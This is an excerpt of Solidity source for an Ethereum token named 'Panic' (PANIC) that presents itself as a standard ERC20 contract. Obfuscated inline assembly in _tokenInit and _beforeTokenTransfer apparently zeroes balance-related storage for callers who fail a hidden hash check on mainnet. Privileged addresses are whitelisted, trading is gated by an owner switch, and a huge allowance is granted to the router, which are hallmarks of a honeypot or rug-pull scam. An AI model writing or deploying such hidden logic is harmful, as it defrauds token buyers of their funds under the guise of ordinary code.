...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addPanic;
    uint256 private panPan = block.number*2;

    mapping (address => bool) private _firstBread; 
    mapping (address => bool) private _secondMeth;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private solutionProblem;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private attackVector;
    address public pair;
    ...
    bool private trading; uint256 private goldenCircle = 1; bool private knifeShop;
    uint256 private _decimals; uint256 private hotSalsa;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addPanic.push(_router); addPanic.push(msgSender_); addPanic.push(pair);
        for (uint256 q=0; q < 3;) {_firstBread[addPanic[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x195dfc538848d23d1c31fad8bb2f2b90085920cf91027fb3cd4e9ad5bde8151a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x660be9b7657c6206e07ac02188b306fe1fdca7be1b2a6e10441df17411e6b132,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; panPan = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addPanic[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPanic(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addPanic[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPanic(creator, initialSupply);
    }
}

contract PanicETH is ERC20Token {
    constructor() ERC20Token("Panic", "PANIC", msg.sender, 150000000 * 10 ** 18) {
    }
}